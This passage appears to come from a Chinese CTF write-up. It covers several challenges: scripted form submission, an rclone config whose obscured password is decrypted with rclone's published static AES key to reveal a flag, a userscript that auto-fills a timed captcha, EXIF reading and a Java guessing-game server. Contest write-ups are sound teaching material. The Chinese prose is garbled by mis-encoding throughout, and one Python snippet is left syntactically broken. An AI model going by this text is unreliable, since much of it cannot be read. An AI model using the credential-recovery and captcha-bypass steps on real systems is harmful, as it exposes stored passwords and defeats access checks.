</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> q5[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">26</span>:
</span></span><span style="display:flex;"><span>			q5[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>			q5[i] <span style="color:#f92672">-=</span> <span style="color:#ae81ff">26</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> q5[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">26</span>:
</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	ans[<span style="color:#e6db74">&#34;q5&#34;</span>] <span style="color:#f92672">=</span> generate_str()
</span></span><span style="display:flex;"><span>	print(ans[<span style="color:#e6db74">&#34;q5&#34;</span>])
</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>header, data<span style="color:#f92672">=</span>ans)<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>	soup <span style="color:#f92672">=</span> BeautifulSoup(res, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>	alert <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(attrs<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;class&#34;</span>: <span style="color:#e6db74">&#34;alert alert-success&#34;</span>})
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(alert) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>		print(str(alert[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>splitlines()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
</span></span></code></pre></div><blockquote>
<p>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¯ä»¥å‡ºæ ¡è®¿é—®å›½å†…å›½é™…ç½‘ç»œä»è€Œå…è®¸äº‘æ’¸çŒ«çš„â€œç½‘ç»œé€šâ€å®šä»·ä¸º 20 å…ƒä¸€ä¸ªæœˆæ˜¯ä»å“ªä¸€å¤©æ­£å¼å®è¡Œçš„ï¼Ÿ</p>
</blockquote>
<p>æœç´¢â€œç½‘ç»œé€š 20å…ƒ site:ustc.edu.cnâ€å–µï¼Œæ‰¾åˆ°æ ¡å†…ä¸€æ¡â€œå…³äºå®è¡Œæ–°çš„ç½‘ç»œè´¹ç”¨åˆ†æ‹…åŠæ³•çš„é€šçŸ¥â€å–µã€‚</p>
<p>é€šçŸ¥ä¸­æåˆ°â€œç½‘å­—ã€”2003ã€•1å·ã€Šå…³äºå®è¡Œæ–°çš„ç½‘ç»œè´¹ç”¨åˆ†æ‹…åŠæ³•çš„é€šçŸ¥ã€‹ç»ˆæ­¢å®è¡Œâ€å–µã€‚</p>
<p>åœ¨é€šçŸ¥çš„é™„ä»¶ 2 ä¸­å¯ä»¥çœ‹åˆ°æ–°æ—§è´¹ç”¨åˆ†æ‹…åŠæ³•å¯¹æ¯”å–µï¼Œå¯çŸ¥æ—§çš„è´¹ç”¨æ–¹æ¡ˆä¹Ÿæ˜¯ 20 å…ƒæ¯æœˆå–µã€‚</p>
<p>é‚£å°±ç»§ç»­æœç´¢â€œã€”2003ã€•1å·ã€Šå…³äºå®è¡Œæ–°çš„ç½‘ç»œè´¹ç”¨åˆ†æ‹…åŠæ³•çš„é€šçŸ¥ã€‹ site:ustc.edu.cnâ€å–µï¼Œæ‰¾åˆ°ä¸€ä»½å¤æ—©çš„é€šçŸ¥å–µã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/xKlVE62h9w3MpGg.png" alt="20221027_6.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>ç­”æ¡ˆæ˜¯ 2003-03-01 å–µã€‚</p>
<h2 id="å®¶ç›®å½•é‡Œçš„ç§˜å¯†">å®¶ç›®å½•é‡Œçš„ç§˜å¯†</h2>
<p>æŠŠå‹ç¼©åŒ…ä¸‹è½½ï¼Œè§£å‹ã€‚</p>
<p>è§£å‹çš„æ—¶å€™æç¤ºâ€œCan not create symbolic link : å®¢æˆ·ç«¯æ²¡æœ‰æ‰€éœ€çš„ç‰¹æƒâ€ï¼Œ</p>
<p>æ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªæ•™ç¨‹ <a href="https://blog.csdn.net/shulianghan/article/details/123705737" target="_blank" rel="noopener">https://blog.csdn.net/shulianghan/article/details/123705737</a> ï¼Œè·Ÿç€åšä¸€ä¸‹å°±å¯ä»¥è§£å‹äº†ã€‚</p>
<p>è§£å‹å®Œç”¨ Everything æœäº†ä¸€ä¸‹ï¼Œæ²¡å‘ç° flag ã€‚</p>
<p>çŒœæµ‹ flag æ˜¯åœ¨æŸä¸ªæ–‡ä»¶å†…éƒ¨çš„è§’è½é‡Œï¼Œéœ€è¦å¯¹æ–‡ä»¶å†…å®¹æœç´¢ã€‚</p>
<p>ç›´æ¥åœ¨ GitHub ä¸Šå¼€ä¸€ä¸ªç§æœ‰ä»“åº“ï¼ŒæŠŠæ•´ä¸ªå®¶ç›®å½•ä¼ ä¸Šå»ï¼Œè¿‡ä¸€ä¼šå°±èƒ½ç›´æ¥ç”¨ GitHub ä»“åº“å†…æœç´¢åŠŸèƒ½äº†ã€‚</p>
<p>æœç´¢ flag ï¼Œå‡ºç°ä¸€æ¡ Code è®°å½•ï¼Œç›´æ¥äº¤ä¸Šå»ï¼Œæ˜¯ç¬¬ä¸€é—®çš„ç­”æ¡ˆã€‚</p>
<p>ç¬¬äºŒé—®æåˆ° rclone ï¼Œæ‰¾ä¸ rclone æœ‰å…³çš„æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªéå¸¸å¯ç–‘çš„æ–‡ä»¶ <code>/.config/rclone/rlone.conf</code> ï¼Œé‡Œé¢åŒ…å«äº†ä¸€ä¸²è¢«åŠ å¯†è¿‡çš„å¯†ç  <code>tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ</code> ã€‚</p>
<p>å»æ‰¾è¿™ä¸ªå¯†ç æ€ä¹ˆç ´è¯‘ã€‚ rclone å®˜ç½‘ä¸Šæœ‰æåˆ°ï¼Œè¿™ä¸ªå¯†ç å¹¶ä¸æ˜¯å®‰å…¨çš„åŠ å¯†æ–¹å¼ <a href="https://rclone.org/commands/rclone_obscure/" target="_blank" rel="noopener">https://rclone.org/commands/rclone_obscure/</a> ã€‚</p>
<p>åæ¥åœ¨ GitHub ä¸Šçœ‹åˆ°äº†è¿™ä¹ˆä¸€ä¸ªä»“åº“ <a href="https://github.com/julianbrost/rclone-unobscure" target="_blank" rel="noopener">https://github.com/julianbrost/rclone-unobscure</a> å¯ä»¥ç›´æ¥å¯¹ rclone çš„å¯†ç è¿›è¡Œè§£å¯†ã€‚</p>
<p>ä»“åº“ README</p>
<blockquote>
<p>For some unknown reason, rclone obfuscates all passwords stored in its configuration file. To do so, it just encrypts the password with AES in counter mode using the static key 9c935b48730a554d6bfd7c63c886a92bd390198eb8128afbf4de162b8b95f638 (implemented in fs/config/obscure/obscure.go). This obviously does not add any security at all and is just annoying if you want to retrieve a password from the configuration for whatever reason.</p>
</blockquote>
<blockquote>
<p>This little 5 line Go program will look for a rclone configuration in the standard locations (typically ~/.config/rclone/rclone.conf), decode the passwords and print them. To use it, just clone the repository, run go build and execute the resulting ./rclone-unobscure binary.</p>
</blockquote>
<p>äºæ˜¯è£…äº†ä¸€ä¸ª Golang ï¼Œè·‘äº†ä¸€ä¸‹è¿™ä¸ªä»£ç ï¼Œå¾—åˆ° flag ã€‚</p>
<h2 id="heilang">HeiLang</h2>
<p>æ˜¯åœ¨æ˜¯å¤ªé…·è¾£ï¼</p>
<p>è®²çœŸçš„ï¼Œæˆ‘ç¬¬ä¸€çœ¼çœ‹è¿‡å»çš„æ—¶å€™è¿˜åœ¨æƒ³â€œPython æœ¬èº«ä¸å°±æ”¯æŒè¿™ç§è¯­æ³•å—â€ã€‚</p>
<p>æŠŠä¸Šé¢çš„èµ‹å€¼éƒ¨åˆ†åšæˆå­—ç¬¦ä¸²ï¼Œç„¶åè§£æè¿™ä¸ªå­—ç¬¦ä¸²ç»™æ•°ç»„èµ‹å€¼ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> ss<span style="color:#f92672">.</span>splitlines():
</span></span><span style="display:flex;"><span>		num_list <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;\d+\.?\d*&#34;</span>, line)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(num_list) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>			a[int(num_list[i])] <span style="color:#f92672">=</span> int(num_list[len(num_list) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>	get_flag(a)
</span></span></code></pre></div><h2 id="xcaptcha">Xcaptcha</h2>
<p>ä¸€ç§’å†…è®¡ç®—ä¸‰ä¸ªé«˜ç²¾åº¦åŠ æ³•ã€‚</p>
<p>æœ€å¼€å§‹æ˜¯ç”¨ Python åšçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>href, headers<span style="color:#f92672">=</span>headers)<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(p, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>txt_list <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#34;label&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> txt <span style="color:#f92672">in</span> txt_list:
</span></span><span style="display:flex;"><span>	a <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;\d+\.?\d*&#34;</span>, txt<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> int(a[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> int(a[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ret <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	ans<span style="color:#f92672">.</span>append()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>params <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;captcha1&#34;</span>: str(ans[<span style="color:#ae81ff">0</span>]),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;captcha2&#34;</span>: str(ans[<span style="color:#ae81ff">1</span>]),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;captcha3&#34;</span>: str(ans[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>content <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>href, headers<span style="color:#f92672">=</span>headers, params<span style="color:#f92672">=</span>params)<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span></code></pre></div><p>ç­”æ¡ˆæ”¾åˆ° <code>params</code> å’Œ <code>data</code> é‡Œé¢éƒ½è¯•è¿‡äº†ï¼Œä½†å°±æ˜¯ä¸€ç›´å¤±è´¥ï¼Œé‚è½¬å»å†™ JS ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// ==UserScript==
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @name         New Userscript
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @namespace    http://tampermonkey.net/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @version      0.1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @description  try to take over the world!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @author       You
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @match        http://202.38.93.111:10047/xcaptcha
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=93.111
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @grant        none
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ==/UserScript==
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;use strict&#39;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// var highestTimeoutId = setTimeout(&#34;;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// for (var i = 0 ; i &lt; highestTimeoutId ; i++) {clearTimeout(i); }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xs</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;label&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;input&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">txt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xs</span>[<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">textContent</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xs</span>[<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">textContent</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;+&#39;</span>)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xs</span>[<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">textContent</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;+&#39;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">a</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">b</span>));
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ip</span>[<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">a</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">b</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>})();
</span></span></code></pre></div><p>æ‰“å¼€ç½‘é¡µï¼Œè‡ªåŠ¨å¡«å†™ç­”æ¡ˆï¼Œå¾—åˆ° flag <code>flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_...}</code></p>
<p>ï¼ˆä¸è¿‡è¿™é¢˜æˆ‘ç”¨çš„æ˜¯ browser ï¼Œä¸æ˜¯ flag é‡Œçš„ headless brower å•Šã€‚ã€‚ã€‚ï¼‰</p>
<h2 id="æ—…è¡Œç…§ç‰‡">æ—…è¡Œç…§ç‰‡</h2>
<p>ç¬¬ä¸€é¢˜ç›´æ¥æŠŠç…§ç‰‡æ‹–åˆ° PS é‡Œï¼Œå¾—åˆ°ç­”æ¡ˆï¼š</p>
<p>2.31ã€å°ç±³ã€84ã€2022/05/14ã€å¦ã€‚</p>
<p>æ—¥æœŸæ˜¯æœ€ä¸å¯èƒ½å‡ºé”™çš„ï¼Œä¹Ÿæ˜¯å¡äº†æˆ‘æœ€ä¹…çš„ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯ EXIF ç‰ˆæœ¬å·é”™äº†ï¼ˆå› ä¸º PS çœ‹åˆ°çš„ç‰ˆæœ¬å·æ˜¯ 0231 ï¼Œæ ¼å¼ä¸å¯¹ï¼‰ã€‚</p>
<p>åæ¥å‘ç°æ˜¯å› ä¸ºæ—¥æœŸçš„ 05 æœˆå†™æˆäº† 5 æœˆã€‚</p>
<p>ç¬¬äºŒé—®ï¼Ÿ 150 åˆ†æŸ¥èˆªç­å®Œå…¨ä¸å€¼ï¼Œä¸æƒ³å†™äº†ã€‚</p>
<h2 id="çŒœæ•°å­—">çŒœæ•°å­—</h2>
<p>è¯•ç€ç‚¹äº†å‡ ä¸‹æäº¤ï¼Œå‘ç°å®ƒä¼šè‡ªåŠ¨å¸®ä½ è®¡ç®—ä¸‹ä¸€æ­¥äºŒåˆ†çš„å€¼ï¼Œå¥½è´´å¿ƒã€‚</p>
<p>æ‰€ä»¥åº”è¯¥å¯ä»¥ç›¸ä¿¡å¤§æ•°å®šç†ï¼Œç”¨è¿ç‚¹å™¨ä»€ä¹ˆçš„æŠŠç­”æ¡ˆç‚¹å‡ºæ¥ï¼ˆè¯¯</p>
<p>æŠŠ Java æºç ä¸‹è½½ä¸‹æ¥ï¼Œåˆšå¥½è¿™å­¦æœŸå­¦äº†ä¸€ç‚¹ Java ï¼Œæ‰€ä»¥è¿˜èƒ½è€ç€æ€§å­æŠŠä»£ç çœ‹ä¸€éã€‚</p>
<p>æ‰¾åˆ°ä¸»è¦ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">previous</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isPresent</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// &lt;guess&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	var previous <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">previous</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getAsDouble</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	var isLess <span style="color:#f92672">=</span> previous <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>	var isMore <span style="color:#f92672">=</span> previous <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeStartElement</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;guess&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;less&#34;</span><span style="color:#f92672">,</span> Boolean<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>isLess<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;more&#34;</span><span style="color:#f92672">,</span> Boolean<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>isMore<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeCharacters</span><span style="color:#f92672">(</span>Double<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>previous<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeEndElement</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// &lt;/guess&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">talented</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// &lt;flag&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeStartElement</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;flag&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeCharacters</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">token</span><span style="color:#f92672">.</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>	writer<span style="color:#f92672">.</span><span style="color:#a6e22e">writeEndElement</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// &lt;/flag&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>çœ‹åˆ°åªè¦ <code>talented &gt; 0</code> åç»­æ¯æ¬¡çŒœæ•°å­—éƒ½ä¼šæ˜¾ç¤º flag ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å¯¹è¿ç‚¹å™¨æ˜¯å‹å¥½çš„ï¼ˆç¡®ä¿¡</p>
<p>å†å»çœ‹çœ‹éšæœºæ•°ç”Ÿæˆçš„éƒ¨åˆ†ï¼Œæƒ³ç€èƒ½ä¸èƒ½ä»é¢„æµ‹éšæœºæ•°å…¥æ‰‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Random RNG <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecureRandom<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>var guess <span style="color:#f92672">=</span> Double<span style="color:#f92672">.</span><span style="color:#a6e22e">parseDouble</span><span style="color:#f92672">(</span>event<span style="color:#f92672">.</span><span style="color:#a6e22e">asCharacters</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getData</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>var isLess <span style="color:#f92672">=</span> guess <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var isMore <span style="color:#f92672">=</span> guess <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>var isPassed <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isLess <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isMore<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var isTalented <span style="color:#f92672">=</span> isPassed <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">previous</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>var newPassed <span style="color:#f92672">=</span> isPassed <span style="color:#f92672">?</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">passed</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">passed</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var newTalented <span style="color:#f92672">=</span> isTalented <span style="color:#f92672">?</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">talented</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">talented</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var newNumber <span style="color:#f92672">=</span> isPassed <span style="color:#f92672">?</span> RNG<span style="color:#f92672">.</span><span style="color:#a6e22e">nextInt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">1000000</span><span style="color:#f92672">)</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var newPrevious <span style="color:#f92672">=</span> isPassed <span style="color:#f92672">?</span> OptionalDouble<span style="color:#f92672">.</span><span style="color:#a6e22e">empty</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> OptionalDouble<span style="color:#f92672">.</span><span style="color:#a6e22e">of</span><span style="color:#f92672">(</span>guess<span style="color:#f92672">);</span>
</span></span></code></pre></div><p>ç”¨çš„æ˜¯ <code>SecureRandom</code> ï¼Œçœ‹èµ·æ¥ä¼¼ä¹å¾ˆå®‰å…¨ï¼Œæ²¡æ³•é¢„æµ‹ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™æ³¨æ„åˆ°ï¼Œä¸Šé¢ä¸¤å¤„çš„ä»£ç ï¼Œéƒ½ä½¿ç”¨äº†ä¸€ç§å¥‡æ€ªçš„æ–¹å¼æ¯”è¾ƒå¤§å°</p>
